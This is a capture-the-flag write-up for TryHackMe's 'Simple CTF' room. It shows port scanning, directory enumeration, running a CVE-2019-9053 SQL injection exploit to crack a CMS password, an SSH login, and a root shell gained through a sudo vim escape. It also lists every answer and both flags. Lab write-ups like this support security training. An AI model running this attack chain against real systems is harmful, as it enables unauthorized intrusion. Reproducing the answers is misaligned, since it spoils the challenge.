# [Simple CTF](https://tryhackme.com/room/easyctf)
### [TryHackMe](https://tryhackme.com/)
Beginner level ctf

### Stats 
Difficulty :   **Easy**

Questions  :   **10**

Victim IP  :   **10.10.108.117**

### Objectives 
* Find user flag
* Find root flag

### How many services are running under port 1000?
To find how many services are running, just perform a port scan. Here what interests us are all the ports below 1000 so we will specify it in our scan. I use the "nmap" tool to do my scan.
```bash
$ sudo nmap 10.10.108.117 -p0-1000
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-09 19:37 CEST
Nmap scan report for 10.10.108.117
Host is up (0.31s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 23.24 seconds
```
We therefore have 2 open ports. 
#### `Answer : 2`

### What is running on the higher port?
We found all ports open between 0 and 1000 but if it is, services are running on higher ports. We then run a scan of all ports. 
```bash
$ sudo nmap 10.10.108.117 -p- -sC -sV
Nmap scan report for 10.10.108.117
Host is up (0.30s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.58.124
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.64 seconds
```
We find the OpenSSH service on port 2222.
#### `Answer : ssh`

### What's the CVE you're using against the application? 
The question tells us to find a CVE (Common Vulnerabilities and Exposures or CVE is a dictionary of public information about security vulnerabilities.) To exploit the system. We know that a web server is running on port 80 so let's see.
![Web Page](./assets/Simple_CTF/WEB_1.png)
This appears to be the default page for the Apache web server. We will go through a directory enumeration. 
```bash
$ dirb http://10.10.108.117/                   

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Aug  9 21:11:52 2021
URL_BASE: http://10.10.108.117/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.108.117/ ----
==> DIRECTORY: http://10.10.108.117/simple/
```
Bingo we found a "/simple" directory.
![Web Page](./assets/Simple_CTF/CMS.png)
We find the text "CMS Made Simple" which is a tool for easily generating web content. The question asks us to find a security flaw to exploit, so let's look at the version of this CMS.
```bash
© Copyright 2004 - 2021 - CMS Made Simple
This site is powered by CMS Made Simple version 2.2.8
```
It is written at the bottom of the page "2.2.8". Now let's look on the internet to see if there is an exploit. I typed in "CMS Made Simple 2.2.8 Exploit" and found this. 
![Web Page](./assets/Simple_CTF/EXPLOIT.png)
We have the CVE 2019-9053.
#### `Answer : CVE-2019-9053`

### To what kind of vulnerability is the application vulnerable?
Looking at the web page we find the name "CMS Made Simple <2.2.10 - SQL Injection". We therefore face a SQL Injection or abbreviation: "sqli".
#### `Answer : sqli`

### What's the password?
After downloading the exploit, we run it with the appropriate parameters.
```bash
$ python2.7 exploit.py -u http://10.10.108.117/simple/ --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret


```
We found a password.
#### `Answer : secret`

### Where can you login with the details obtained?
We have a "mitch" user and a "secret" password. We can surely try to connect to the ssh service. 
```bash
$ ssh mitch@10.10.108.117 -p 2222  
The authenticity of host '[10.10.108.117]:2222 ([10.10.108.117]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.108.117]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.108.117's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ 

```
We did it.
#### `Answer : ssh`

### What's the user flag?
Apparently there is a flag, let's find it.
```bash
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
```
It was easy...
#### `Answer : G00d j0b, keep up!`

### Is there any other user in the home directory? What's its name?
Under Linux each user has a directory with his name in the "/home" folder.
```bash
$ ls /home
mitch  sunbath
```
We find our user "mitch" and another user "sunbath".
#### `Answer : sunbath`

### What can you leverage to spawn a privileged shell?
To increase our privileges there are a multitude of techniques but as here we have the password of our user, we can try to find which commands we can execute as "root". 
```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```
This means that I, "mitch", can execute the command "/usr/bin/vim" as "root" without using a password. 
#### `Answer : vim`

### What's the root flag?
To exploit basic binaries I look at the [GTFOBins](https://gtfobins.github.io/) site. 
![Web Page](./assets/Simple_CTF/GTFOBINS.png)
```bash
$ sudo /usr/bin/vim -c ':!/bin/sh'

# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!
```
#### `Answer : W3ll d0n3. You made it!`

Write-up made wit :heart: by @LaGelee